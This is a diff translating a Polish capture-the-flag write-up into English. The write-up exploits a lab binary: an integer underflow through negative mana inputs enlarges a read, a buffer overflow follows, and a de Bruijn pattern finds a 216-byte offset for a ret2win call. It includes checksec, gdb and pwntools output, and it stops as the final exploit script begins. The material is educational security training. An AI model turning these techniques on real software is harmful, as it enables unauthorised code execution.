@@ -1,17 +1,17 @@
 # potion brewing exam
 
-## Skrót
-- Integer Underflow, aby otrzymać całkowitą manę >200
-- Buffer overflow w funkcji `cast_spell`
+## TLDR
+- Integer Underflow, to get total mana >200
+- Buffer overflow in function `cast_spell`
 - ret2win (`get_ancient_power`)
 
-## Rekonesans
-W plikach zadania dostajemy
-- plik binarny
-- kod źródłowy
+## Reconnaissance
+In the task files we get
+- binary file
+- source code
 - Dockerfile
 
-Najpierw sprawdzamy z czym mamy do czynienia.
+First we check what we are dealing with.
 
 ```console
 $ file potion_brewing_exam
@@ -28,13 +28,13 @@ $ pwn checksec potion_brewing_exam
     PIE:      No PIE (0x400000)
 ```
 
-Widzimy, że plik jest 64-bitowy i zlinkowany dynamicznie. Z checksec wyczytujemy, że:
-- ma częściowe `RELRO`
-- nie ma kanarka
-- bit `NX` jest włączony
-- adres bazowy jest stały
+We see that the file is 64-bit and dynamically linked. From the checksec we read that:
+- it has a partial `RELRO`.
+- no canary
+- the `NX` bit is enabled
+- base address is fixed
 
-Pzy przeglądaniu kodu źródłowego skupiamy się na funkcji `main`:
+When reviewing the source code, we focus on the `main` function:
 
 ```c
 int main(void)
@@ -76,9 +76,9 @@ int main(void)
 }
 ```
 
-Program prosi nas o 4 składniki do mikstury. Nazwa, składnika nie jest nigdzie używana, więc można ją zignorować. Program prosi też o manę składnika, która nie może przekraczać `50`.
+The program asks us for 4 ingredients for a mixture. The name, of the ingredient is not used anywhere, so you can ignore it. The program also asks for the mana of the ingredient, which must not exceed `50`.
 
-Na końcu program wywołuje funkcję `cast_spell`, jako argument podając sumę many wszystkich składników.
+Finally, the program calls the `cast_spell` function, with the sum of the mana of all ingredients as an argument.
 
 ```c
 void cast_spell(int mana)
@@ -91,9 +91,9 @@ void cast_spell(int mana)
 }
 ```
 
-Funkcja wczytuje do bufora o wielkości 200B tyle znaków, ile wynosi suma naszej many. Jeżeli udałoby nam się przekazać funkcji wartość większą niż 200, to mielibyśmy podatność `buffer overflow`.
+The function loads into a 200B buffer as many characters as the sum of our mana. If we managed to pass a value larger than 200 to the function, we would have a `buffer overflow` vulnerability.
 
-W kodzie jest jeszcze jedna ciekawa funkcja: `get_ancient_power`.
+There is another interesting function in the code: `get_ancient_power`.
 
 ```c
 void get_ancient_power(void)
@@ -113,12 +113,13 @@ void get_ancient_power(void)
 }
 ```
 
-Jest to po prostu funkcja `win`, którą musimy wywołać aby dostać flagę.
+It is simply a `win` function that we have to call to get a flag.
 
-## Rozwiązanie
-Mamy już mentalny model, jak należy rozwiązać zadanie. Jeżeli uda nam się zyskać więcej many niż 200, to dzięki podatności typu buffer overflow będziemy mogli nadpisać return address funkcji `cast_spell` adresem `get_ancient_power` i zdobyć flagę. 
+## Solution
+We already have a mental model of how the task should be solved. If we can gain more mana than 200, then thanks to a buffer overflow vulnerability, we will be able to override the return address of the `cast_spell` function with the `get_ancient_power` address and get the flag. 
 
-Ilość many, z jednego składnika, którą możemy zdobyć ogranicza ten warunek:
+The amount of mana, from one component, that we can gain limits this condition:
+
 ```c
 if(mana_boost > 50)
 {
@@ -129,32 +130,33 @@ if(mana_boost > 50)
 }
 ```
 
-Wczytanie many wygląda tak:
+Loading the mana looks like this:
 ```c
 printf("mana boost: ");
 scanf("%d", &mana_boost);
 ```
 
-Jak widzimy, program wczytuje manę jako integer ze znakiem, ale nie sprawdza dolnej granicy. Możemy więc wpisać wartości ujemne.
+As we can see, the program loads mana as an integer with a sign, but does not check the lower bound. So we can enter negative values.
 
-Minimalna wartość inta ze znakiem wynosi `–2147483648`. Jeżeli nasza mana spadnie poniżej tej wartości to przez to, że int zapisywany jest tylko na 4 bajtach, zamieni się na wartość dodatnią. Potrzebujemy więc co najmniej 2 składników z ujemną wartością many, żeby przekręcić licznik. Jest to tzw. `Integer Underflow` np.:
+The minimum value of int with sign is `-2147483648`. If our mana falls below this value, it will turn into a positive value by virtue of the fact that int is stored on only 4 bytes. So we need at least 2 components with a negative mana value to turn the counter. This is known as the `Integer Underflow`. `Integer Underflow` e.g.:
 
-    1 składnik:
+    1 ingredient:
         mana: -2147483447 [-(INT_MAX-200)]
-        całkowita mana: -2147483447
-    2 składnik:
+        total mana: -2147483447
+    2 ingredient:
         mana: -2147483447 [-(INT_MAX-200)]
-        całkowita mana: ~400
-    3 składnik:
+        total mana: ~400
+    3 ingredient:
         mana: 0
-        całkowita mana: ~400
-    4 składnik:
+        total mana: ~400
+    4 ingredient:
         mana: 0
-        całkowita mana: ~400
+        total mana: ~400
 
-Tym sposobem uzyskujemy wynik na jakim nam zależy, przy tym nie podając nigdy wartości większej niż `50`.
+This way we get the result we want, while never giving a value greater than `50`.
 
-Możemy to sprawdzić przy pomocy gdb.
+We can check this with gdb.
+
 
 ```
 gef➤  b cast_spell 
@@ -204,9 +206,9 @@ read@plt (
 gef➤  
 ```
 
-Wartość `rdx` = 0x192 = 402
+Value `rdx` = 0x192 = 402
 
-Teraz wystarczy tylko znaleźć offset potrzebny do nadpisania return address. Możemy to prosto zrobić za pomocą cyklu de Bruijna.
+Now we just need to find the offset needed to override the return address. We can easily do this using the de Bruijn cycle.
 
 ```console
 $ pwn cyclic 400
@@ -214,7 +216,7 @@ $ pwn cyclic 400
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
 ```
 
-Po wpisaniu ciągu do funkcji read.
+After typing the string into the read function.
 ```
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffdc08│+0x0000: "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"	 ← $rsp
@@ -239,9 +241,9 @@ $ pwn cyclic -l eaac
 216
 ```
 
-Musimy więc wysłać 216 bajtów paddingu po czym adres funkcji `get_ancient_power`.
+So we need to send 216 bytes of padding followed by the address of the `get_ancient_power` function.
 
-## Finalny exploit
+## Final exploit
 ```py
 #!/usr/bin/env python
 from pwn import *
